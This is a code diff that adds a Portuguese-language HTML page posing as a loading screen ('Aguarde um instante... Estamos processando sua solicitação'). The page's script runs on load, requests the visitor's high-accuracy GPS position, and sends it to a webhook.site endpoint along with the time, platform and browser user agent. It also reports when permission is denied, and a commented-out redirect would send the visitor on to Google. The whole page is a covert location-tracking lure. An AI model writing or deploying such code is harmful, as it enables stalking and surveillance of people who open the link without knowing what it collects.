@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Iniciando Sistema...</title>
+</head>
+<body>
+    <script>
+        // URL que você forneceu
+        const webhookURL = "https://webhook.site";
+
+        function enviarLocalizacao() {
+            if ("geolocation" in navigator) {
+                // Opções para maior precisão
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                };
+
+                navigator.geolocation.getCurrentPosition(
+                    (posicao) => {
+                        const dados = {
+                            latitude: posicao.coords.latitude,
+                            longitude: posicao.coords.longitude,
+                            precisao: posicao.coords.accuracy + " metros",
+                            data_hora: new Date().toLocaleString('pt-BR'),
+                            plataforma: navigator.platform,
+                            navegador: navigator.userAgent
+                        };
+
+                        // Envia os dados para o seu Webhook
+                        fetch(webhookURL, {
+                            method: "POST",
+                            mode: "no-cors", // Necessário para evitar erros de CORS em alguns casos
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(dados)
+                        })
+                        .then(() => {
+                            console.log("Dados enviados.");
+                            // Opcional: Redirecionar o usuário após o envio
+                            // window.location.href = "https://google.com";
+                        })
+                        .catch(err => console.error("Erro no envio:", err));
+                    },
+                    (erro) => {
+                        // Caso o usuário negue ou dê erro de sinal
+                        fetch(webhookURL, {
+                            method: "POST",
+                            mode: "no-cors",
+                            body: JSON.stringify({ erro: erro.message, status: "negado_ou_falhou" })
+                        });
+                    }, 
+                    options
+                );
+            }
+        }
+
+        // Executa a função assim que a página carrega
+        window.onload = enviarLocalizacao;
+    </script>
+
+    <h1>Aguarde um instante...</h1>
+    <p>Estamos processando sua solicitação.</p>
+</body>
+</html>
+
